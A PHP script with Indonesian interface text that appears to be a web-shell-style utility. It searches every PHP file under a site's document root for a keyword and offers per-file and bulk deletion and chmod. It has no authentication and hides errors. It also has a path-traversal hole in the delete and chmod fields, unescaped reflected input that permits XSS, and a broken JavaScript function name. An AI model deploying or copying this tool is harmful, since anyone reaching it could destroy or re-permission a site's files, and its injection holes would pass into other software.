<?php
ini_set('display_errors', 0);
function cariKataDalamFile($kata, $direktori) {
    $result = array();
    $validExtensions =
    [
        'php',
        'phps',
        'phtml',
        'php3',
        'php4',
        'php5',
        'php7',
        'php8',
        'php56',
        'shtml',
        'inc',
        'module',
        'pht',
        'phar',
        'phar'
    ];

    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($direktori, RecursiveDirectoryIterator::SKIP_DOTS));
    foreach ($iterator as $file) {
        if ($file->isFile() && in_array($file->getExtension(), $validExtensions)) {
            $filePath = $file->getPathname();
            if (is_readable($filePath)) {
                $content = fopen($filePath, 'r');
                if ($content) {
                    while (($line = fgets($content)) !== false) {
                        if (strpos($line, $kata) !== false) {
                            $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $filePath);
                            $result[] = array(
                                'path' => $relativePath,
                                'permissions' => substr(sprintf('%o', fileperms($filePath)), -4)
                            );
                            break;
                        }
                    }
                    fclose($content);
                }
            }
        }
    }

    return $result;
}



function getInfoPemilik($path) {
    $owner = posix_getpwuid(fileowner($path))['name'];
    $group = posix_getgrgid(filegroup($path))['name'];

    return array('owner' => $owner, 'group' => $group);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['delete']) && !empty($_POST['delete'])) {
        $fileToDelete = $_SERVER['DOCUMENT_ROOT'] . $_POST['delete'];
        if (file_exists($fileToDelete) && is_file($fileToDelete) && pathinfo($fileToDelete, PATHINFO_EXTENSION) === 'php') {
            if (unlink($fileToDelete)) {
                echo "<center>File '$fileToDelete' berhasil dihapus.</center>";
            } else {
                echo "<center>Gagal menghapus file '$fileToDelete'.</center>";
            }
        }
    }
    if (isset($_POST['chmod']) && !empty($_POST['chmod'])) {
        $fileToChmod = $_SERVER['DOCUMENT_ROOT'] . $_POST['chmod'];
        if (file_exists($fileToChmod) && is_file($fileToChmod) && pathinfo($fileToChmod, PATHINFO_EXTENSION) === 'php') {
            $newPermissions = octdec($_POST['permissions']);
            if (chmod($fileToChmod, $newPermissions)) {
                echo "<center>chmod berhasil pada file '$fileToChmod'</center> ";
            } else {
                echo "<center>gagal Chmod File pada'$fileToChmod'</center> ";
            }
        }
    }
if (isset($_POST['bulkdelete'])) {
    $kataCari = $_POST['bulkdelete'];
    $documentRoot = $_SERVER['DOCUMENT_ROOT'];
    $currentFile = $_SERVER['SCRIPT_FILENAME'];
    $hasilPencarian = cariKataDalamFile($kataCari, $documentRoot);

    $fileDeleted = false;
    $deleteFailed = false;

    foreach ($hasilPencarian as $fileInfo) {
        $fileToDelete = $documentRoot . $fileInfo['path'];
        if ($fileToDelete !== $currentFile && file_exists($fileToDelete) && is_file($fileToDelete) && pathinfo($fileToDelete, PATHINFO_EXTENSION) === 'php') {
            if (unlink($fileToDelete)) {
                $fileDeleted = true;
            } else {
                $deleteFailed = true;
            }
        }
    }

    if ($fileDeleted) {
        echo "<center>Semua File berhasil dihapus.</center>";
    } elseif ($deleteFailed) {
        echo "<center>Gagal menghapus beberapa file.</center>";
    }
}

if (isset($_POST['bulkchmod'])) {
    $kataCari = $_POST['bulkchmod'];
    $documentRoot = $_SERVER['DOCUMENT_ROOT'];
    $currentFile = $_SERVER['SCRIPT_FILENAME'];
    $hasilPencarian = cariKataDalamFile($kataCari, $documentRoot);
    $totalFiles = count($hasilPencarian);
    $fileChmodded = false;
    $chmodFailed = false;

    foreach ($hasilPencarian as $fileInfo) {
        $fileToChmod = $documentRoot . $fileInfo['path'];
        if ($fileToChmod !== $currentFile && file_exists($fileToChmod) && is_file($fileToChmod) && pathinfo($fileToChmod, PATHINFO_EXTENSION) === 'php') {
            $newPermissions = octdec($_POST['permissions']);
            if (chmod($fileToChmod, $newPermissions)) {
                $fileChmodded = true;
            } else {
                $chmodFailed = true;
            }
        }
    }

    if ($fileChmodded) {
        echo "<center>Semua File berhasil diubah permissions.</center>";
    } elseif ($chmodFailed) {
        echo "<center>Gagal mengubah permissions beberapa file.</center>";
    }
}
}
if (isset($_GET['find']) && !empty($_GET['find'])) {
    $kataCari = $_GET['find'];
    $documentRoot = $_SERVER['DOCUMENT_ROOT'];
    $hasilPencarian = cariKataDalamFile($kataCari, $documentRoot);
    $totalFiles = count($hasilPencarian);
    $progressStep = 100 / $totalFiles;
    $currentProgress = 0;
    if (empty($hasilPencarian)) {
        echo "Kata '$kataCari' tidak ditemukan dalam file-file PHP di direktori dan subdirektori.";
    } else {

        echo "<script>
                function updateProgress(progress) {
                    var progressBar = document.getElementById('progress-bar');
                    progressBar.style.width = progress + '%';
                    progressBar.innerHTML = progress + '%';
                }
              </script>";
        echo "<script>
                function file-count(filecount) {

                }
              </script>";
        echo "<style>
                .progress-container {
                    width: 100%;
                    margin-top: 20px;
                }
                .info {
                  background-color: #fff9d7;
                  border: 1px solid #e2c822;
                  padding: 4px 10px;
                  margin: 5px 0;
                }
                .progress-bar {
                    width: 0%;
                    height: 30px;
                    background-color: #4CAF50;
                    text-align: center;
                    line-height: 30px;
                    color: white;
                }
                table {
                    width: 100%;
                    border-collapse: collapse;
                }
              </style>";
        echo "<center>
              <div class='progress-container'>
              <div id='progress-bar' class='progress-bar'>0%</div>
              </div>
              </center>";
        echo "<br>";
        echo "<div>";
        echo "<center>";
        echo "<form style='display: inline-block;' method='post' action=''>";
        echo "<input type='hidden' name='bulkdelete' value='$kataCari'>";
        echo "<input type='submit' value='Bulk Delete'>";
        echo "</form>";
        echo "-";
        echo "<form style='display: inline-block;' method='post' action=''>";
        echo "<input type='hidden' name='bulkchmod' value='$kataCari'>";
        echo "<input type='number' name='permissions' required>";
        echo "<input type='submit' value='Bulk Chmod'>";
        echo "</form>";
        echo "<center><div class='info'><div id='file-count'>Total Files: $totalFiles</div></div></center>";
        echo "<table border='1'>";
        echo "<tr><th>File Path</th><th>Owner</th><th>Group</th><th>Permissions</th><th>Action</th></tr>";
        foreach ($hasilPencarian as $fileInfo) {
        $file = $fileInfo['path'];
        $permissions = $fileInfo['permissions'];
        $infoPemilik = getInfoPemilik($_SERVER['DOCUMENT_ROOT'] . $file);
        $owner = $infoPemilik['owner'];
        $group = $infoPemilik['group'];
        $deleteUrl = $_SERVER['PHP_SELF'] . "?delete=" . urlencode(str_replace($_SERVER['DOCUMENT_ROOT'], '', $file));
        $chmodUrl = $_SERVER['PHP_SELF'] . "?chmod=" . urlencode(str_replace($_SERVER['DOCUMENT_ROOT'], '', $file));

        echo "<tr>";
        echo "<td><a href='$file' target='_blank'>$file</a></td>";
        echo "<td>$owner</td>";
        echo "<td>$group</td>";
        echo "<td style='color: " . ($owner === 'root' ? 'black' : 'green') . ";'>$permissions</td>";
        echo "<td><form style='display: inline-block;' method='post' action=''><input type='hidden' name='delete' value='$file'>";
        echo "<input type='submit' value='Hapus'></form>";
        echo "||";
        echo "<form style='display: inline-block;' method='post' action=''><input type='hidden' name='chmod' value='$file'><input type='number' name='permissions' required> ";
        echo "<input type='submit' value='Ubah Permissions'></form></td>";
        echo "</tr>";

        $currentProgress += $progressStep;
        echo "<script>updateProgress($currentProgress);</script>";
        flush();
        ob_flush();
        usleep(100000);
        }
        echo "</table>";
        echo "</center>";
        echo "</div>";
    }
}
?>
